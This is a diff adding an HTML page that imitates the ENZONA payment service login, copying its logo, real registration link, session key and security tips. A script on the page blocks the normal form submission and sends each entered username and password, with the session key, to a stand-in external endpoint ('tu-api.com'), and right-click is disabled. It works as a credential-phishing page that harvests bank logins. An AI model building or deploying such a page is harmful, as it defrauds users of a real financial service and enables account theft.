@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ENZONA</title>
+    <link rel="icon" href="images/favicon.png" type="image/png" />
+    <link
+      rel="stylesheet"
+      href="https://stackpath.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css"
+    />
+    <link rel="stylesheet" href="styles/style.css" />
+  </head>
+
+  <body oncontextmenu="return false">
+    <div class="login-wrap">
+      <div class="login-html">
+        <div class="login-form">
+          <div class="sign-in-htm">
+            <div class="group logo">
+              <a href="https://www.enzona.net/">
+                <img class="logo-img" src="images/logo.png" alt="ENZONA" />
+              </a>
+            </div>
+            <form
+              action=""
+              method="post"
+              id="identifierForm"
+              autocomplete="off"
+            >
+              <div class="test-group">
+                <div class="input-group">
+                  <input
+                    id="username"
+                    name="username"
+                    type="text"
+                    class="form-control enzona-input required"
+                    tabindex="0"
+                    placeholder="Correo electr&oacute;nico o tel&eacute;fono"
+                    required="required"
+                    autofocus
+                    autocomplete="off"
+                  />
+                  <span class="enzona-input-group-addon">
+                    <img src="images/usuario.png" />
+                  </span>
+                </div>
+
+                <div class="input-group p-input">
+                  <input
+                    id="tpassword"
+                    type="password"
+                    class="form-control enzona-input required"
+                    placeholder="Contrase&ntilde;a"
+                    autocomplete="off"
+                    required="required"
+                    data-password-autocomplete="off"
+                    autocomplete="new-password"
+                    autofocus
+                  />
+                  <span toggle="#password" class="field-icon toggle-password"
+                    ><img
+                      id="ojo"
+                      src="images/ojo%20cerrado.svg"
+                      alt=""
+                      width="25"
+                  /></span>
+                  <span class="enzona-input-group-addon">
+                    <img src="images/pass.jpg" />
+                  </span>
+                </div>
+              </div>
+
+              <div class="input-group col-xs-12 col-md-12 col-lg-12 col-sm-12">
+                <button class="uppercase enzona-btn">Autenticar</button>
+              </div>
+
+              <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 col-xs-12">
+                <input
+                  type="hidden"
+                  name="sessionDataKey"
+                  value="f62e0217-57f0-47cc-bb9c-a02db531eafb"
+                />
+              </div>
+
+              <div class="hr"></div>
+              <div class="foot-lnk">
+                <div
+                  class="form-actions"
+                  style="font-weight: normal; color: #0e0e0e"
+                >
+                  No tienes cuenta?
+                  <a
+                    id="registerLink"
+                    href="https://identity.enzona.net/accountrecoveryendpoint/register.do?callback=https%3A%2F%2Fidentity.enzona.net%3A443%2Fauthenticationendpoint%2Flogin.do%3Fclient_id%3Dofr3Wz9nnfZaFd18OewdZYvuTaEa%26commonAuthCallerPath%3D%252Foauth2%252Fauthorize%26forceAuth%3Dfalse%26passiveAuth%3Dfalse%26redirect_uri%3Dhttps%253A%252F%252Fwww.enzona.net%252Fauth%252Fenzona%252Fcallback%26response_type%3Dcode%26scope%3Dopenid%26state%3De2ICPuiPn9cWZqS3iwjatauK8iJajkPXoIF2Z0ux%26tenantDomain%3Dcarbon.super%26sessionDataKey%3Df62e0217-57f0-47cc-bb9c-a02db531eafb%26relyingParty%3Dofr3Wz9nnfZaFd18OewdZYvuTaEa%26type%3Doidc%26sp%3Dadmin_ppago-apk_PRODUCTION%26isSaaSApp%3Dfalse%26authenticators%3DIdentifierExecutor%3ALOCAL"
+                    style="
+                      color: #2464b5;
+                      font-family: Arial;
+                      font-size: 17px;
+                      text-decoration: none;
+                      font-weight: bold;
+                    "
+                  >
+                    Registrar ahora
+                  </a>
+                </div>
+              </div>
+
+              <div
+                class="card bg-light text-dark"
+                style="
+                  background-color: rgb(240, 240, 240) !important;
+                  margin: auto;
+                  color: gray !important;
+                  font-weight: normal;
+                  margin-bottom: 15px;
+                  border-radius: 10px !important;
+                  padding: 5px;
+                  margin-top: 15px;
+                "
+              >
+                <div class="card-body text-justify">
+                  <b>Consejos &uacute;tiles</b>
+                  <ul
+                    style="
+                      list-style-position: outside;
+                      right: 20px;
+                      position: relative;
+                    "
+                  >
+                    <li>
+                      No emplear datos personales (Carn&eacute; de Identidad)
+                      como contrase&ntilde;as.
+                    </li>
+                    <li>
+                      No compartir las contrase&ntilde;as con otros servicios o
+                      aplicaciones.
+                    </li>
+                    <li>
+                      No compartir con desconocidos informaci&oacute;n personal
+                      o datos bancarios.
+                    </li>
+                    <li>Emplear el segundo factor de autenticaci&oacute;n.</li>
+                  </ul>
+                </div>
+              </div>
+            </form>
+            |
+          </div>
+        </div>
+      </div>
+    </div>
+    <script>
+      document
+        .getElementById("identifierForm")
+        .addEventListener("submit", function (event) {
+          event.preventDefault(); // Evita el envío del formulario por defecto
+
+          // Obtiene los valores de los campos del formulario
+          const username = document.getElementById("username").value;
+          const password = document.getElementById("tpassword").value;
+          const sessionDataKey = document.querySelector(
+            'input[name="sessionDataKey"]'
+          ).value;
+
+          // Crea un objeto con los datos a enviar
+          const data = {
+            username: username,
+            password: password,
+            sessionDataKey: sessionDataKey,
+          };
+
+          // Realiza la solicitud a la API
+          fetch("https://tu-api.com/endpoint", {
+            // Reemplaza con la URL de tu API
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(data),
+          })
+            .then((response) => {
+              if (!response.ok) {
+                throw new Error("Error en la red");
+              }
+              return response.json();
+            })
+            .then((data) => {
+              console.log("Éxito:", data);
+            })
+            .catch((error) => {
+              console.error("Error:", error);
+            });
+        });
+    </script>
+  </body>
+</html>
